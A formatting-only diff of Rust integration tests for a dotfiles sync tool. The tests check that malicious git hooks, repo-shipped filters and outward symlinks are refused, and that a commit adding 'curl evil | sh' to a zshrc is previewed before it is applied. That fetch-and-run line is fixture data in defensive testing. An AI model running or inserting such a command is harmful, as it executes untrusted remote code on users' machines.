@@ -9,9 +9,7 @@ use std::path::{Path, PathBuf};
 
 use soulcaster_core::approval::{ApprovalStore, Approvals, CommitSha, DotfilesApproval};
 use soulcaster_core::catalog::Catalog;
-use soulcaster_core::command::{
-    Command, CommandOutput, CommandRunner, OutputStream, SpawnError,
-};
+use soulcaster_core::command::{Command, CommandOutput, CommandRunner, OutputStream, SpawnError};
 use soulcaster_core::config::Config;
 use soulcaster_core::lint::DEFAULT_CLONE_LOCATION;
 use soulcaster_core::plan::DotfilesPlan;
@@ -105,7 +103,10 @@ fn world() -> World {
     let server = base.join("server");
     fs::create_dir_all(&server).unwrap();
     sh(&server, &["init", "--quiet", "--initial-branch=main"]);
-    sh(&server, &["config", "uploadpack.allowAnySHA1InWant", "true"]);
+    sh(
+        &server,
+        &["config", "uploadpack.allowAnySHA1InWant", "true"],
+    );
     let mut tools = Tools::fixed(home.clone());
     tools.git = Some(PathBuf::from(GIT));
     let store = FileApprovals::new(base.join("approvals.json"));
@@ -200,7 +201,12 @@ fn a_config_on_this_mac_cannot_run_a_hook_during_the_clone() {
     // The attack from the design: a linked ~/.gitconfig with a hook and an fsmonitor.
     let hooks = world.home.join("evil-hooks");
     fs::create_dir_all(&hooks).unwrap();
-    for name in ["post-checkout", "post-merge", "pre-commit", "reference-transaction"] {
+    for name in [
+        "post-checkout",
+        "post-merge",
+        "pre-commit",
+        "reference-transaction",
+    ] {
         let hook = hooks.join(name);
         fs::write(&hook, format!("#!/bin/sh\ntouch '{}'\n", marker.display())).unwrap();
         fs::set_permissions(&hook, fs::Permissions::from_mode(0o755)).unwrap();
@@ -232,11 +238,7 @@ fn a_config_on_this_mac_cannot_run_a_hook_during_the_clone() {
 fn a_filter_or_a_hook_shipped_inside_the_repo_does_nothing() {
     let world = world();
     let marker = world.home.join("filter-ran");
-    fs::write(
-        world.server.join(".gitattributes"),
-        "* filter=evil\n",
-    )
-    .unwrap();
+    fs::write(world.server.join(".gitattributes"), "* filter=evil\n").unwrap();
     // A file named like a hook, in a folder named like one. It can't be `.git/hooks`.
     fs::create_dir_all(world.server.join("hooks")).unwrap();
     fs::write(
@@ -267,12 +269,17 @@ fn a_repo_symlink_pointing_outside_is_checked_out_and_then_refused() {
     let approved = commit_file(&world.server, "zsh/zshrc", "approved\n");
     let runner = runner(&world);
     let mut plan = plan();
-    plan.links.insert("~/.outward".to_string(), "outward".to_string());
+    plan.links
+        .insert("~/.outward".to_string(), "outward".to_string());
     approve(&world, &plan, &approved);
     let report = step(&world, &runner)
         .apply_links(&plan, UserStage::password_is_gone())
         .unwrap();
-    let row = report.rows.iter().find(|r| r.target == "~/.outward").unwrap();
+    let row = report
+        .rows
+        .iter()
+        .find(|r| r.target == "~/.outward")
+        .unwrap();
     assert!(matches!(row.outcome, LinkOutcome::Refused(_)), "{row:?}");
     assert!(fs::symlink_metadata(world.home.join(".outward")).is_err());
 }
@@ -308,7 +315,11 @@ fn a_preview_fetches_the_newer_commit_and_moves_nothing_until_approved() {
     let newer = commit_file(&world.server, "zsh/zshrc", "curl evil | sh\n");
 
     let preview = step(&world, &runner).preview_move(&plan, &newer).unwrap();
-    assert!(preview.text().contains("+curl evil | sh"), "{}", preview.text());
+    assert!(
+        preview.text().contains("+curl evil | sh"),
+        "{}",
+        preview.text()
+    );
     assert_eq!(
         fs::read_to_string(world.home.join(".zshrc")).unwrap(),
         "approved\n",
@@ -317,7 +328,9 @@ fn a_preview_fetches_the_newer_commit_and_moves_nothing_until_approved() {
     let clone = world.home.join("Developer/dotfiles");
     assert_eq!(sh(&clone, &["rev-parse", "HEAD"]), approved.as_str());
 
-    step(&world, &runner).move_after_review(&plan, &preview).unwrap();
+    step(&world, &runner)
+        .move_after_review(&plan, &preview)
+        .unwrap();
     assert_eq!(sh(&clone, &["rev-parse", "HEAD"]), newer.as_str());
     assert_eq!(world.store.read().unwrap().dotfiles.unwrap().commit, newer);
     assert_eq!(
@@ -340,7 +353,9 @@ fn own_changes_in_the_clone_stop_a_move() {
     let preview = step(&world, &runner).preview_move(&plan, &newer).unwrap();
     fs::write(world.home.join("Developer/dotfiles/zsh/zshrc"), "my edit\n").unwrap();
     assert_eq!(
-        step(&world, &runner).move_after_review(&plan, &preview).unwrap_err(),
+        step(&world, &runner)
+            .move_after_review(&plan, &preview)
+            .unwrap_err(),
         DotfilesError::ChangesOnThisMac
     );
     assert_eq!(
@@ -353,7 +368,10 @@ fn own_changes_in_the_clone_stop_a_move() {
 fn bare_config_repo(world: &World) -> PathBuf {
     let bare = world.server.parent().unwrap().join("config-repo.git");
     fs::create_dir_all(&bare).unwrap();
-    sh(&bare, &["init", "--quiet", "--bare", "--initial-branch=main"]);
+    sh(
+        &bare,
+        &["init", "--quiet", "--bare", "--initial-branch=main"],
+    );
     sh(&bare, &["config", "uploadpack.allowAnySHA1InWant", "true"]);
     bare
 }
@@ -385,11 +403,19 @@ fn a_save_is_the_canonical_file_authored_by_the_noreply_address_and_nothing_else
         },
     )
     .unwrap();
-    let SaveOutcome::Sent { commit, created_repo, .. } = outcome else {
+    let SaveOutcome::Sent {
+        commit,
+        created_repo,
+        ..
+    } = outcome
+    else {
         panic!("{outcome:?}");
     };
     assert!(created_repo);
-    assert_eq!(sh(&bare, &["rev-parse", "refs/heads/main"]), commit.as_str());
+    assert_eq!(
+        sh(&bare, &["rev-parse", "refs/heads/main"]),
+        commit.as_str()
+    );
     assert_eq!(
         sh(&bare, &["show", "main:configs/my-mac.json"]).trim_end(),
         config.to_canonical_json().trim_end()
@@ -409,7 +435,12 @@ fn a_save_on_top_of_a_moved_repo_keeps_what_else_is_there() {
     let other = commit_file(&world.server, "configs/other.json", "{}\n");
     sh(
         &world.server,
-        &["push", "--quiet", bare.to_str().unwrap(), "HEAD:refs/heads/main"],
+        &[
+            "push",
+            "--quiet",
+            bare.to_str().unwrap(),
+            "HEAD:refs/heads/main",
+        ],
     );
     let fake = FakeGitHub::new();
     fake.sign_in("example-you", 42);
